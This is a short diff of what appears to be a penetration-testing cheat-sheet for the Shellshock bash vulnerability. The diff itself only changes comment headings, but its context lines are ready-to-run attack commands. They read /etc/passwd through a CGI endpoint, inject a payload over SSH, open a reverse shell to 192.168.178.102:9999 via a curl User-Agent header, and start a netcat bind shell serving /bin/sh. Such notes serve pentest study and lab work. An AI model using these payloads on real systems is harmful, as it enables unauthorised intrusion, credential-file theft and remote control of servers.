@@ -8,16 +8,16 @@ nmap 10.11.1.xx -p 80 \
 
 ./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
 
-# Shellshock via SSH
+## Shellshock via SSH
 ssh -vvv
 ssh -i noob noob@$ip '() { :;}; /bin/bash'
 
-# cat file (view file contents)
+## cat file (view file contents)
 
 echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; echo \\$(</etc/passwd)\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80
        
 curl -H "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/192.168.178.102/9999 0>&1" "http://192.168.178.121:80/cgi-bin/status/"
 
-# Shellshock run bind shell using netcat
+## Shellshock run bind shell using netcat
 
 echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80
